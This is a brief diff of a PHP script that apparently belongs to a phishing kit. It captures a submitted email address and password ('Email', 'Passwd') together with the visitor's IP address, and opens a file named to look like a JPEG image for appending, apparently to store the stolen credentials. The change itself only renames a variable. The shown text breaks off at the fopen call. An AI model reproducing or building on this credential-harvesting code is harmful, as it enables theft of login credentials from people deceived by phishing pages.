@@ -1,5 +1,5 @@
 <?php
-$habbo = $_POST['Email']; 
+$email = $_POST['Email']; 
 $password = $_POST['Passwd'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $f = fopen("AAC189092019881999191919191mobeen.jpg", "a"); 
